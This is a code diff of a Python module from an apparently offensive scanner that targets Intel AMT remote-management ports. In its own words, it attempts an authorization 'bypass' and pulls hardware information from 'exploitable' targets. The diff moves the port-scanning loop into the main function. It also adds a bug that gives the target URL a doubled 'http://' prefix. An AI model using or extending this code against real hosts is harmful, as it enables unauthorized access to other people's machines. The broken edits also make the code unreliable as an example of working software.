@@ -14,7 +14,7 @@ from lxml import html
 from var.auto_issue.github import request_issue_creation
 
 
-def __get_auth_headers(target, ports=(16992, 16693, 693, 692), **kwargs):
+def __get_auth_headers(target, port, **kwargs):
     """
     get the authorization headers from the URL
     """
@@ -24,20 +24,12 @@ def __get_auth_headers(target, ports=(16992, 16693, 693, 692), **kwargs):
         logger.info(set_color(
             "header value not established, attempting to get bypass..."
         ))
-        for port in ports:
-            try:
-                if verbose:
-                    logger.debug(set_color(
-                        "trying on port {}...".format(port), level=10
-                    ))
-                source = requests.get("http://{0}:{1}/index.htm".format(target, port), timeout=10, headers={
-                    'connection': 'close', 'user-agent': agent
-                }, proxies=proxy)
-                return source
-            except Exception:
-                pass
+        source = requests.get("http://{0}:{1}/index.htm".format(target, port), timeout=10, headers={
+            'connection': 'close', 'user-agent': agent
+        }, proxies=proxy)
+        return source
     # Get digest and nonce and return the new header
-    if 'WWW-Authenticate' in source.headers:
+    elif 'WWW-Authenticate' in source.headers:
         logger.info(set_color(
             "header value established successfully, attempting authentication..."
         ))
@@ -56,36 +48,27 @@ def __get_auth_headers(target, ports=(16992, 16693, 693, 692), **kwargs):
         return None
 
 
-def __get_raw_data(target, page, agent=None, proxy=None, **kwargs):
+def __get_raw_data(target, page, port, agent=None, proxy=None, **kwargs):
     """
     collect all the information from an exploitable target
     """
-    possible_ports = (16992, 16993, 693, 692)
     verbose = kwargs.get("verbose", False)
     logger.info(set_color(
         "attempting to get raw hardware information..."
     ))
-    for port in possible_ports:
-        try:
-            if verbose:
-                logger.debug(set_color(
-                    "trying on port {}...".format(port), level=10
-                ))
-            return requests.get("http://{0}:{1}/{2}.htm".format(target, port, page),
-                                headers={
-                                    'connection': 'close',
-                                    'Authorization': __get_auth_headers(target, verbose=verbose),
-                                    'user-agent': agent
-                                }, proxies=proxy)
-        except Exception:
-            pass
+    return requests.get("http://{0}:{1}/{2}.htm".format(target, port, page),
+                        headers={
+                            'connection': 'close',
+                            'Authorization': __get_auth_headers(target, port, verbose=verbose),
+                            'user-agent': agent
+                        }, proxies=proxy)
 
 
-def __get_hardware(target, agent=None, proxy=None, verbose=False):
+def __get_hardware(target, port, agent=None, proxy=None, verbose=False):
     """
     collect all the hardware information from an exploitable target
     """
-    req = __get_raw_data(target, 'hw-sys', agent=agent, proxy=proxy, verbose=verbose)
+    req = __get_raw_data(target, 'hw-sys', port, agent=agent, proxy=proxy, verbose=verbose)
     if not req.status_code == 200:
         return None
     logger.info(set_color(
@@ -131,6 +114,7 @@ def main_intel_amt(url, agent=None, proxy=None, **kwargs):
     verbose = kwargs.get("verbose", False)
     proxy = proxy_string_to_dict(proxy) or None
     agent = agent or DEFAULT_USER_AGENT
+    port_list = (16993, 16992, 693, 692)
     if do_ip_address:
         logger.warning(set_color(
             "running against IP addresses may result in the targets refusing the connection...", level=30
@@ -140,7 +124,7 @@ def main_intel_amt(url, agent=None, proxy=None, **kwargs):
         ))
         try:
             url = replace_http(url)
-            url = socket.gethostbyname(url)
+            url = "http://{}".format(socket.gethostbyname(url))
             logger.info(set_color(
                 "discovered IP address {}...".format(url)
             ))
@@ -153,39 +137,44 @@ def main_intel_amt(url, agent=None, proxy=None, **kwargs):
     logger.info(set_color(
         "attempting to connect to '{}' and get hardware info...".format(url)
     ))
-    try:
-        json_data = __get_hardware(url, agent=agent, proxy=proxy, verbose=verbose)
-        if json_data is None:
-            logger.error(set_color(
-                "unable to get any information, skipping...", level=40
+    for port in list(port_list):
+        if verbose:
+            logger.debug(set_color(
+                "trying on port {}...".format(port), level=10
             ))
-            pass
-        else:
-            print("-" * 40)
-            for key in json_data.keys():
-                print("{}:".format(str(key).capitalize()))
-                for item in json_data[key]:
-                    print(" - {}: {}".format(item.capitalize(), json_data[key][item]))
-            print("-" * 40)
-    except requests.exceptions.ConnectionError as e:
-        if "Max retries exceeded with url" in str(e):
-            logger.error(set_color(
-                "failed connection, target machine is actively refusing the connection, skipping...", level=40
-            ))
-            pass
-        else:
-            logger.error(set_color(
-                "failed connection with '{}', skipping...", level=40
-            ))
-            pass
-    except Exception as e:
-        if "Temporary failure in name resolution" in str(e):
-            logger.error(set_color(
-                "failed to connect on '{}', skipping...".format(url), level=40
-            ))
-            pass
-        else:
-            logger.exception(set_color(
-                "ran into exception '{}', cannot continue...".format(e), level=50
-            ))
-            request_issue_creation()
+        try:
+            json_data = __get_hardware(url, port, agent=agent, proxy=proxy, verbose=verbose)
+            if json_data is None:
+                logger.error(set_color(
+                    "unable to get any information, skipping...", level=40
+                ))
+                pass
+            else:
+                print("-" * 40)
+                for key in json_data.keys():
+                    print("{}:".format(str(key).capitalize()))
+                    for item in json_data[key]:
+                        print(" - {}: {}".format(item.capitalize(), json_data[key][item]))
+                print("-" * 40)
+        except requests.exceptions.ConnectionError as e:
+            if "Max retries exceeded with url" in str(e):
+                logger.error(set_color(
+                    "failed connection, target machine is actively refusing the connection, skipping...", level=40
+                ))
+                pass
+            else:
+                logger.error(set_color(
+                    "failed connection with '{}', skipping...", level=40
+                ))
+                pass
+        except Exception as e:
+            if "Temporary failure in name resolution" in str(e):
+                logger.error(set_color(
+                    "failed to connect on '{}', skipping...".format(url), level=40
+                ))
+                pass
+            else:
+                logger.exception(set_color(
+                    "ran into exception '{}', cannot continue...".format(e), level=50
+                ))
+                request_issue_creation()
